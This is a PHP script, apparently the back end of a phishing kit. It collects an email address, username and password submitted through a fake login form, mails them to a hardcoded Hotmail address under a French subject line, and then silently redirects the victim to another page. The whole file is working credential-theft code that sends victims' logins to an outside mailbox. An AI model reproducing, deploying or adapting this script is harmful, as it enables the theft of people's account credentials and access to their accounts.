<?php 
//die( $_POST[''credential'].'  '.$_POST['password']);

//echo '<a href="index.html">index.html</a>';


$sujet = 'Nouveau mail du Sage a la date du : '.date("d-M-Y", strtotime("now")).' a '.date("H:i:s", strtotime("now"));
$message = 'email =>'.$_POST['wb_input_0'].'Nom d\'utilisateur =>'.$_POST['wb_input_1'].' et le Mot de passe => '.$_POST['wb_input_2'];
$destinataire = 'aurelien.merieux@hotmail.com';
$headers .= "Bcc: " . "\r\n";
$headers = "From: \"\"aurelien.merieux@hotmail.com>\n";
$headers .= "Reply-To: aurelien.merieux@hotmail.com\n";
$headers .= "Content-Type: text/plain; charset=\"iso-8859-1\"";

if(mail($destinataire,$sujet,$message,$headers))
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("replay.php")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
else
{
?>
<script type="text/javascript">function redirection(page)
  {window.location=page;}
setTimeout('redirection("index.html")',0000);
//1000 millisecondes=1 secondes, le temps après lequel on redirige.</script>
<?php
}
?>